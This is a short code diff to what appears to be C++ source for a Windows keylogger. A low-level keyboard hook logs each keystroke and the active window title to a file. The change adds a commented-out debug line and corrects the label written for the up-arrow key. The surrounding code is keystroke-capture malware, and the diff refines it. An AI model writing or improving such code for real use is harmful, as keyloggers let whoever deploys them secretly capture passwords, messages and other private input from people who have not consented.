@@ -28,6 +28,7 @@ void Write(string key)
     ofstream fout(FILENAME, ios::app);
     if (fout.is_open())
     {
+        //cout << "\nFile is open\n";
         string towrite = "";
         if (wcscmp(prev_window, curr_window) != 0) //current window != previous window
         {
@@ -432,7 +433,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode,                    // hook code
             }
             case VK_UP:
             {
-                Write("[RIGHT]");
+                Write("[UP]");
                 break;
             }
             case VK_RIGHT:
